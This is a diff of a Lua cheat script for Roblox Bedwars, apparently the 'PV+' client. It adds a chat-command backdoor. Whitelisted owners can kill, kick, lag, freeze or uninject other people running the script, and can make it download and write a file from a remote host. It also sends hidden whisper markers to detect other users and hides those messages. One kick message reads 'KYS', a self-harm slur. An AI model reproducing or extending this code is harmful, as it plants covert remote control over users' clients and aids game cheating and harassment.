@@ -1,72 +1,61 @@
 local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/PVOwner/WhitelistForRobloxBedwars/main/data.json"))
-
-local colors = {
-    ["red"] = "#ff0000",
-    ["orange"] = "#ff7800",
-    ["yellow"] = "#e5ff00",
-    ["green"] = "#00ff00",
-    ["blue"] = "#0000ff",
-    ["purple"] = "#b800b8",
-    ["pink"] = "#ff00ff",
-    ["black"] = "#000000",
-    ["white"] = "#ffffff",
-}
-
 local function getLplrType()
-    local lplr_Type = 0
-    if whitelist["Owner"] ~= nil then
-        for i, v in pairs(whitelist["Owner"]) do
-            if v.id == tostring(lplr.UserId) then
-                lplr_Type = 3
-                return lplr_Type
-            end
-        end
-    end
-    if whitelist["Private"] ~= nil then
-        for i, v in pairs(whitelist["Private"]) do
-            if v.id == tostring(lplr.UserId) then
-                lplr_Type = 1
-                return lplr_Type
-            end
-        end
-    end
-    return lplr_Type
+	local lplr_Type = 0
+	if whitelist["Mario"] ~= nil then
+		for i,v in pairs(whitelist["Mario"]) do
+			if v.id == tostring(lplr.UserId) then
+				lplr_Type = 2
+				return lplr_Type
+			end
+		end
+	end
+	if whitelist["Private"] ~= nil then
+		for i,v in pairs(whitelist["Private"]) do
+			if v.id == tostring(lplr.UserId) then
+				lplr_Type = 1
+				return lplr_Type
+			end
+		end
+	end
+	return lplr_Type
 end
 
-local function CanAttackUser(u)
-    local userId = tostring(u.UserId)
-    local userType = 0
+local MoonUsers = {}
 
-    if whitelist["Private"] ~= nil then
-        for i, v in pairs(whitelist["Private"]) do
-            if v.id == userId then
-                userType = 1
-                break
-            end
-        end
-    end
+function CanAttackUser(u)
+	local userId = tostring(u.UserId)
+	local userType = 0
 
-    if whitelist["Owner"] ~= nil then
-        for i, v in pairs(whitelist["Owner"]) do
-            if v.id == userId then
-                userType = 3
-                break
-            end
-        end
-    end
+	if whitelist["Private"] ~= nil then
+		for i, v in pairs(whitelist["Private"]) do
+			if v.id == userId then
+				userType = 1
+				break
+			end
+		end
+	end
 
-    return getLplrType() >= userType
+	if whitelist["Mario"] ~= nil then
+		for i, v in pairs(whitelist["Mario"]) do
+			if v.id == userId then
+				userType = 2
+				break
+			end
+		end
+	end
+
+	return getLplrType() >= userType
 end
 
 local commands = {
-    [";kill"] = function()
+	[";kill"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
 	end,
 	[";video"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local filename = "bruh"
+			local filename = "nice"
 			local ScreenGui = Instance.new("ScreenGui")
 			ScreenGui.IgnoreGuiInset = true
 			ScreenGui.Parent = game:GetService("CoreGui")
@@ -77,7 +66,7 @@ local commands = {
 
 			local Name = filename .. ".mp4"
 			if not isfile(Name) then
-				writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
+				writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".mario"))
 			end
 
 			video.Video = syn and getsynasset(Name) or getcustomasset(Name)
@@ -133,7 +122,7 @@ local commands = {
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			wait(1)
 			for index, player in pairs(game.Players:GetPlayers()) do
-				player:Kick("PV+ Private User Or Owner Kick You")
+				player:Kick("KYS There From PV+ Private User/Owner")
 			end
 		end
 	end,
@@ -210,15 +199,15 @@ local commands = {
 			while true do end
 		end
 	end,
+	[";uninject"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			GuiLibrary.SelfDestruct()
+		end
+	end,
 	[";ping"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local thingy = settings().Network
 			thingy.IncomingReplicationLag = math.huge
-		end
-	end,
-	[";uninject"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			GuiLibrary.SelfDestruct()
 		end
 	end,
 	[";lag"] = function()
@@ -260,39 +249,158 @@ local commands = {
 }
 
 function isPlayerAllowed()
-    return false
+	return false
 end
 
 local txt = game:GetService("TextChatService")
+local private = {}
+local users = {}
 
-local function updateTag(msg, hasTag, tagColor)
-    if hasTag then
-        local color = colors[tagColor] or colors["pink"]
-        local tag = msg.TextSource.tag
-        msg.PrefixText = "<font color='" .. color .. "'>[" .. tag .. "]</font> " .. msg.PrefixText
-    end
-end
-
-txt.OnIncomingMessage:Connect(function(msg)
-    if msg.TextSource then
-        local userId = tostring(msg.TextSource.UserId)
-        local hasTag, tagColor = displayTag(userId)
-        updateTag(msg, hasTag, tagColor)
-
-        local command = msg.Text
-        if commands[command] and command:find("default") == nil then
-            local tag = msg.TextSource.tag
-            local plr
-            for i, v in pairs(game.Players:GetPlayers()) do
-                if v.tag == tag then
-                    plr = v
-                    break
-                end
-            end
-
-            if plr and not CanAttackUser(plr) then
-                commands[command]()
-            end
-        end
-    end
+task.spawn(function()
+	repeat task.wait()
+		for i,plr in pairs(game.Players:GetPlayers()) do 
+			if table.find(private,plr) then return end
+			if not CanAttackUser(plr) then
+				local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+				local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
+				newchannel:SendAsync("ALAAZA")
+				table.insert(private,plr)
+				task.wait(1)
+				textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+			end
+		end
+	until false
 end)
+
+local users = {}
+
+txt.OnIncomingMessage = function(msg)
+	local p = Instance.new("TextChatMessageProperties")
+	local message = msg
+	if msg.TextSource then
+		local plr2
+		local userId = tostring(msg.TextSource.UserId)
+		for i,v in pairs(game.Players:GetPlayers()) do
+			if tostring(v.UserId) == userId then
+				plr2 = v
+				break
+			end
+		end
+		local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
+		if CanAttackUser(plr2) and plr2 ~= lplr then
+			if message.Text:find("ALAAZA") then
+				warningNotification("PV+ Notify",plr2.Name.." is using PV+!",60)
+				table.insert(users,plr2.UserId)
+			end
+		end
+		if message.Text:find("ALAAZA") or message.Text:lower():find("privately") then
+			p.PrefixText = ""
+			return p
+		end
+		for i,v in pairs(commands) do
+			if tostring(i) == tostring(message.Text).." default" or tostring(i) == tostring(message.Text).." "..lplr.DisplayName or tostring(i) == tostring(message.Text) then
+				local plr
+				for i,v in pairs(game.Players:GetPlayers()) do
+					if tostring(v.UserId) == userId then
+						plr = v
+						break
+					end
+				end
+				if plr == nil then break end
+				if not CanAttackUser(plr) then
+					v()
+				end
+				break
+			end
+		end
+		local colors = {
+			["red"] = "#ff0000",
+			["orange"] = "#ff7800",
+			["yellow"] = "#e5ff00",
+			["green"] = "#00ff00",
+			["blue"] = "#0000ff",
+			["purple"] = "#b800b8",
+			["pink"] = "#ff00ff",
+			["black"] = "#000000",
+			["white"] = "#ffffff",
+		}
+		if CanAttackUser(plr2) and plr2 ~= lplr then
+			if message.Text:find("ALAAZA") then
+				warningNotification("PV+ Notify",plr2.Name.." is using PV+!",60)
+				table.insert(users,plr2.UserId)
+				table.insert(whitelist["tags"],{
+					userid = plr2.UserId,
+					color = "yellow",
+					tag = "PV+ USER"
+				})
+			end
+		end
+		if message.Text:lower():find("alaaza") or message.Text:lower():find("you are now privately chatting") then 
+			p.PrefixText = ""
+			msg.Text = ""
+			return p
+		end
+		for i,v in pairs(commands) do
+			if tostring(i) == tostring(message.Text) then
+				local plr
+				for i,v in pairs(game.Players:GetPlayers()) do
+					if tostring(v.UserId) == userId then
+						plr = v
+						break
+					end
+				end
+				if plr == nil or plr == lplr then break end
+				if not CanAttackUser(plr) then
+					v()
+				end
+				break
+			end
+		end
+		p.PrefixText = msg.PrefixText
+		print(message.Text,":",userId)
+
+		local userType = 0
+		local hasTag = false
+		if users[plr2.UserId] ~= nil then
+			p.PrefixText = "<font color='"..colors["yellow"].."'>[PV+ USER]</font> " .. msg.PrefixText
+			hasTag = true
+			return p
+		end
+
+		if whitelist["tags"] ~= nil then
+			for i, v in pairs(whitelist["tags"]) do
+				if v.userid == userId then
+					hasTag = true
+					local color = colors[v.color] or colors["pink"]
+					p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
+				end
+			end
+		end
+
+		if whitelist["Private"] ~= nil then
+			for i, v in pairs(whitelist["Private"]) do
+				if v.id == userId then
+					if not hasTag then
+						hasTag = true
+						p.PrefixText = "<font color='"..colors["purple"].."'>[PV+ PRIVATE]</font> " .. msg.PrefixText
+					end
+					userType = 1
+				end
+			end
+		end
+
+		if whitelist["Mario"] ~= nil then
+			for i, v in pairs(whitelist["Mario"]) do
+				if v.id == userId then
+					if not hasTag then
+						hasTag = true
+						p.PrefixText = "<font color='"..colors["pink"].."'>[PV+ OWNER]</font> " .. msg.PrefixText
+					end
+					userType = 2
+				end
+			end
+		end
+	end
+
+	return p
+end
